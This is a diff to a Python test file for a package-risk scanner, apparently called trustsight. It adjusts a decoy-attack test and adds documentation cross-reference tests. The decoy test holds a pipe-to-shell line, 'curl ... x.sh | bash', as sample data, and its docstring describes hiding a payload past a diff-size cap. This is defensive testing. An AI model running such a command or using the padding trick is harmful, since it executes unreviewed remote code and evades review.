@@ -206,14 +206,22 @@ def test_a_complete_high_renders_bare():
     assert verdict_label(PackageFact(final_score=75, risk="High")) == "High"
 
 
-def test_the_decoy_attack_end_to_end():
+def test_the_decoy_attack_end_to_end(tmp_path, monkeypatch):
     """The whole move, through the real pipeline, not a hand-built fact.
 
     Cheap deliberate HIGH in the visible prefix, padding to the cap, the
     real payload after the cut.  The band survives on the decoy's own
     evidence, which is correct; what must not survive is presenting that
     band as if the whole change had been read.
+
+    The config dir is pointed at a fresh directory so the run uses the
+    shipped defaults and cannot be swayed by a developer's own
+    ``~/.config/trustsight`` (the bucket weights are part of the band
+    math this test pins, and CI has no user config at all).
     """
+    import trustsight.config as config_module
+
+    monkeypatch.setattr(config_module, "CONFIG_DIR", tmp_path / "config")
     config = load_config()
     config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 900}}
     decoy = "+build() {\n+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n+}\n"
@@ -350,6 +358,46 @@ def test_a_real_version_passes_the_shape_check(version):
 
 
 # --- the baseline bound ---------------------------------------------------
+
+
+def test_doc_cross_references_resolve():
+    from security_gates import gate_doc_cross_references_resolve
+
+    gate = gate_doc_cross_references_resolve()
+    assert gate.passed, gate.measured
+
+
+def test_a_renamed_heading_is_caught(tmp_path, monkeypatch):
+    """The failure this gate exists for: rename a heading, break the links.
+
+    Every sentence on the page stays true and nothing else fails, which
+    is the documentation-level form of skipping content without
+    recording a gap.
+    """
+    import security_gates
+
+    docs = tmp_path / "docs"
+    docs.mkdir()
+    (docs / "a.md").write_text("# A\n\nSee [B](b.md#the-old-name).\n")
+    (docs / "b.md").write_text("# B\n\n## The new name\n")
+    monkeypatch.setattr(security_gates, "ROOT", tmp_path)
+
+    gate = security_gates.gate_doc_cross_references_resolve()
+    assert not gate.passed
+    assert any("no such anchor" in problem for problem in gate.measured)
+
+
+def test_a_regex_in_inline_code_is_not_a_link(tmp_path, monkeypatch):
+    """`(?<![^\x00-\x7F])[...]` contains `](...)` and is not markup."""
+    import security_gates
+
+    docs = tmp_path / "docs"
+    docs.mkdir()
+    (docs / "a.md").write_text(
+        "# A\n\n- **Pattern:** `(?<![^\\x00-\\x7F])[\\u200B](?![^\\x00-\\x7F])`\n"
+    )
+    monkeypatch.setattr(security_gates, "ROOT", tmp_path)
+    assert security_gates.gate_doc_cross_references_resolve().passed
 
 
 def test_a_baseline_cannot_supply_rules_or_weights():
